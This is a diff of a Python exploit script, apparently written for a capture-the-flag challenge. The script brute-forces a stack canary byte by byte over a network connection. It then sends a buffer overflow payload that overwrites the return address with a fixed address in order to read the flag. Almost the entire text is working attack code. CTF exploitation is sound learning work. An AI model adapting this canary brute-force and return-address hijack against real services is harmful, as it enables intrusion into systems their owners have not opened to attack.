@@ -9,23 +9,23 @@ conn.recvuntil("How many cookies do you want?")
 conn.sendline("-1")
 
 start_payload =  b"A" * 8 + bytes([0])
-payload = ""
+payload = b""
 # Bruteforce the canary value
 canary = b""
-for i in range(6):
+for i in range(7):
     for c in range(256):
+        conn.recvuntil("Which")
         payload = start_payload + canary + bytes([c])
-        print(i+1,"/7",c,"/255:",payload)
-        conn.recvuntil("Which" , timeout=3)
+        print(i+1,"/7",c,":",payload)
         conn.send_raw(payload)
-        if not conn.recvuntil("*" , timeout=4):
+        if not conn.recvuntil("*" , timeout=3):
             canary = canary + bytes([c])
             break
-        time.sleep(0.1)
+    
 
-# the final payload
-payload = start_payload + canary +  p64(0x4012b6)
-print("final payload:\t",payload,"\nfound", i ,"bytes\n")
+# Final payload
+payload = start_payload + canary + b"B" * 8 + p64(0x4012b6)
+print("Found", i+1 ,"bytes, Canary found:",canary,"\nFinal payload:\t",payload)
 # Send the final payload and print the flag
 conn.sendline(payload)
 print(conn.recvall().decode())
